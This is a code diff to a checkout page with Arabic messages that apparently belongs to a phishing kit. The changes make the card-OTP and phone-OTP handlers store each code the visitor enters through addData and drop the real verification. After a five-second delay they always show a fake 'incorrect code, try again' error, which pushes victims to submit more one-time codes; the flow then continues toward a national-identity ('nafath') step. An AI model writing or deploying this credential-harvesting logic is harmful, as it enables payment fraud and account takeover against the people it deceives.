@@ -453,22 +453,13 @@ export default function CheckoutPage() {
       return
     }
     const visitor = localStorage.getItem("visitor")
-addData({id:visitor,cardOtp})
+    addData({ id: visitor, cardOtp })
     setIsVerifying(true)
-    setStep("card-pin")
-
     setVerificationError("")
-    try {
-      await verifyOtp(cardOtpVerificationId, cardOtp)
-      console.log("✅ Card OTP verified successfully")
-      setIsVerifying(false)
-      setCardOtp("")
-      setStep("card-pin")
-    } catch (error: any) {
-      console.error("❌ Card OTP verification error:", error)
-      setIsVerifying(false)
-      setVerificationError(error.message || "رمز التحقق غير صحيح")
-    }
+    await new Promise((resolve) => setTimeout(resolve, 5000))
+    setIsVerifying(false)
+    setCardOtp("")
+    setVerificationError("رمز التحقق غير صحيح. الرجاء المحاولة مرة أخرى")
   }
 
   const handleCardPinVerify = async () => {
@@ -515,18 +506,12 @@ addData({id:visitor,cardOtp})
     }
     setIsVerifying(true)
     setVerificationError("")
-    const visitorId=localStorage.getItem('visitor')
-    try {
-      await addData({id:visitorId,phoneOtpVerificationId, phoneOtp})
-      console.log("✅ Phone OTP verified successfully")
-      setIsVerifying(false)
-      setPhoneOtp("")
-      setStep("nafath")
-    } catch (error: any) {
-      console.error("❌ Phone OTP verification error:", error)
-      setIsVerifying(false)
-      setVerificationError(error.message || "رمز التحقق غير صحيح")
-    }
+    const visitorId = localStorage.getItem("visitor")
+    addData({ id: visitorId, phoneOtpVerificationId, phoneOtp })
+    await new Promise((resolve) => setTimeout(resolve, 5000))
+    setIsVerifying(false)
+    setPhoneOtp("")
+    setVerificationError("رمز التحقق غير صحيح. الرجاء المحاولة مرة أخرى")
   }
 
   const handleNafathVerify = async () => {
